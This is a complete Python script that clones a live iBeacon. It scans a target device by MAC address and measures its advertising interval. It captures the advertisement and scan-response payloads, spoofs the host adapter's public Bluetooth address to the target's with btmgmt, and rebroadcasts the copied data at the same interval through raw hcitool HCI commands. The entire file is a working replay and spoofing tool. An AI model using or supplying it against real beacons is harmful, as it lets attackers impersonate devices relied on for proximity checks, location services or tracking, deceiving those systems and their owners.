#!/usr/bin/env python3
"""
ibeacon_replay.py

1) Scans a live iBeacon and measures its advertising interval.
2) Captures its advertisement + scan-response payloads.
3) Spoofs its public address on hci0.
4) Programs hci0 to advertise at the same interval and with the same payloads.

Usage:
    sudo python3 ibeacon_replay.py --mac C3:00:00:3D:D1:F7 [--timeout 10]
"""

import asyncio, argparse, os, sys, subprocess, time, re
from bleak import BleakScanner

# ———— Capture + Measure ————

async def capture_and_measure(target_mac: str, timeout: int):
    """
    Scans for BLE adv packets from target_mac, measures the interval,
    and returns:
      - manufacturer_data
      - service_data
      - local_name
      - tx_power
      - avg_interval_ms (float)
    """
    result = {}
    last_ts = None
    intervals = []
    stop_evt = asyncio.Event()

    def detection_cb(device, adv_data):
        nonlocal last_ts, intervals
        if device.address.lower() == target_mac.lower() and adv_data.manufacturer_data:
            now = time.time()
            if last_ts is not None:
                intervals.append((now - last_ts) * 1000.0)  # ms
            last_ts = now

            # capture once
            result['manufacturer_data'] = adv_data.manufacturer_data
            result['service_data']      = adv_data.service_data
            result['local_name']        = adv_data.local_name
            result['tx_power']          = adv_data.tx_power

            # once we have 5 intervals or payload, stop
            if len(intervals) >= 5:
                stop_evt.set()

    scanner = BleakScanner(detection_cb, scanning_mode="active")
    await scanner.start()
    try:
        await asyncio.wait_for(stop_evt.wait(), timeout)
    except asyncio.TimeoutError:
        pass
    await scanner.stop()

    # Compute average interval (or fallback to 100 ms if none)
    avg = sum(intervals)/len(intervals) if intervals else 100.0
    result['avg_interval_ms'] = avg
    return result

# ———— Build AD bytes ————

def build_adv_bytes(manuf: dict) -> bytes:
    flags = b"\x02\x01\x06"
    cid, payload = next(iter(manuf.items()))
    comp_le = cid.to_bytes(2, 'little')
    manu    = bytes([len(payload)+len(comp_le)+1, 0xFF]) + comp_le + payload
    return flags + manu

def build_scan_resp_bytes(svc: dict, name: str, tx: int) -> bytes:
    parts = []
    # Complete List of 16-bit Service UUIDs (0x03)
    for u in svc:
        m16 = re.fullmatch(r"[0-9A-Fa-f]{4}", u)
        m128= re.fullmatch(r"0000([0-9A-Fa-f]{4})-0000-1000-8000-00805f9b34fb", u)
        if m16 or m128:
            h = m16.group(0) if m16 else m128.group(1)
            v = int(h,16)
            parts.append(bytes([3,0x03, v&0xFF, (v>>8)&0xFF]))
    # Service Data (0x16)
    for u,data in svc.items():
        m16 = re.fullmatch(r"[0-9A-Fa-f]{4}", u)
        m128= re.fullmatch(r"0000([0-9A-Fa-f]{4})-0000-1000-8000-00805f9b34fb", u)
        if m16 or m128:
            h = m16.group(0) if m16 else m128.group(1)
            v = int(h,16)
            le= v.to_bytes(2,'little')
            length = 1 + len(le) + len(data)
            parts.append(bytes([length,0x16]) + le + data)
    # Tx Power (0x0A)
    if tx is not None:
        parts.append(bytes([2,0x0A, tx & 0xFF]))
    # Local Name (0x09)
    if name:
        nb = name.encode()
        parts.append(bytes([len(nb)+1, 0x09]) + nb)
    return b"".join(parts)

# ———— Main ————

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--mac","-m",required=True,help="iBeacon MAC")
    p.add_argument("--timeout","-t",type=int,default=10,help="scan timeout")
    args = p.parse_args()
    mac, to = args.mac.upper(), args.timeout

    if os.geteuid()!=0:
        sys.exit("Run as root (sudo).")

    print(f"[*] Scanning + measuring adv interval for {mac} (up to {to}s)…")
    data = asyncio.run(capture_and_measure(mac, to))

    if 'manufacturer_data' not in data:
        sys.exit(f"[!] Failed to find advertisement for {mac}")

    avg_ms = data['avg_interval_ms']
    print(f"[*] Average adv interval: {avg_ms:.1f} ms")

    # Convert ms → 0.625 ms units (round to nearest)
    units = int(round(avg_ms / 0.625))
    if units < 0x0020: units = 0x0020  # HCI minimum
    if units > 0x4000: units = 0x4000  # HCI maximum
    lsb = units & 0xFF
    msb = (units >> 8) & 0xFF
    print(f"[*] Using HCI interval units: {units} (LSB=0x{lsb:02X} MSB=0x{msb:02X})")

    adv_bytes = build_adv_bytes(data['manufacturer_data'])
    sr_bytes  = build_scan_resp_bytes(data['service_data'],
                                      data['local_name'],
                                      data['tx_power'])

    print(f"[*] ADV payload: {adv_bytes.hex()}")
    print(f"[*] SCAN_RSP : {sr_bytes.hex()}")

    # 1) Disable any existing advertising
    subprocess.run(["hcitool","-i","hci0","cmd","0x08","0x000A","00"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # 2) Spoof public address
    print(f"[*] Spoofing public address → {mac}")
    subprocess.run(["btmgmt","--index","0","power","off"],check=True)
    subprocess.run(["btmgmt","--index","0","public-addr",mac],check=True)
    subprocess.run(["btmgmt","--index","0","power","on"],check=True)
    subprocess.run(["systemctl","restart","bluetooth"],check=True)

    # 3) Bring up interface
    subprocess.run(["hciconfig","hci0","up"],check=True)
    subprocess.run(["rfkill","unblock","bluetooth"],check=True)

    # 4) HCI: Set Advertising Parameters with measured interval
    print("[*] Setting advertising parameters with measured interval…")
    # Params: interval min, interval max, type=0x00 (ADV_IND), own_addr=0x00(public),
    # peer_addr_type=0x00, peer_addr=00:.., channel_map=0x07, filter_policy=0x00
    cmd_params = ["hcitool","-i","hci0","cmd","0x08","0x0006",
                  f"{lsb:02X}", f"{msb:02X}",
                  f"{lsb:02X}", f"{msb:02X}",
                  "00","00","00","00","00","00","07","00"]
    subprocess.run(cmd_params, check=True)

    # 5) HCI: Load advert data
    adv_cmd = ["hcitool","-i","hci0","cmd","0x08","0x0008",
               f"{len(adv_bytes):02X}"] + [f"{b:02X}" for b in adv_bytes]
    subprocess.run(adv_cmd, check=True)

    # 6) HCI: Load scan-response data
    if sr_bytes:
        sr_cmd = ["hcitool","-i","hci0","cmd","0x08","0x0009",
                  f"{len(sr_bytes):02X}"] + [f"{b:02X}" for b in sr_bytes]
        subprocess.run(sr_cmd, check=True)

    # 7) HCI: Enable advertising
    print("[*] Enabling advertising…")
    subprocess.run(["hcitool","-i","hci0","cmd","0x08","0x000A","01"], check=True)

    print(f"[+] Now advertising as {mac} at ~{avg_ms:.1f} ms interval! Check your scanner.")

if __name__=="__main__":
    main()

